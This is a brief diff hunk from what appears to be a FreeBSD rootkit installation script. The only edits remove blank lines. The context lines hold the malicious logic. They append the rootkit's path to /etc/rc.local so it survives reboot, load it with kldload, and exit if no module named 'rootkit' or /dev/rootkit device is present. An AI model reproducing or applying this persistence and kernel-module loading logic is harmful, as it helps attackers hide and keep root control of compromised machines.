@@ -137,11 +137,9 @@ chmod +x /etc/rc.local
 if ! grep -q "hide_kld" /etc/rc.local; then
     echo "$ABS_PATH &" >> /etc/rc.local
 fi
-
 # Load it during the current boot
 if [ "$MODULE_LOADED" = false ]; then
     kldload "$PERSISTENCE_FILE"
-
     if ! kldstat -q -m rootkit >/dev/null 2>&1 && [ ! -c /dev/rootkit ]; then
         exit 1
     fi
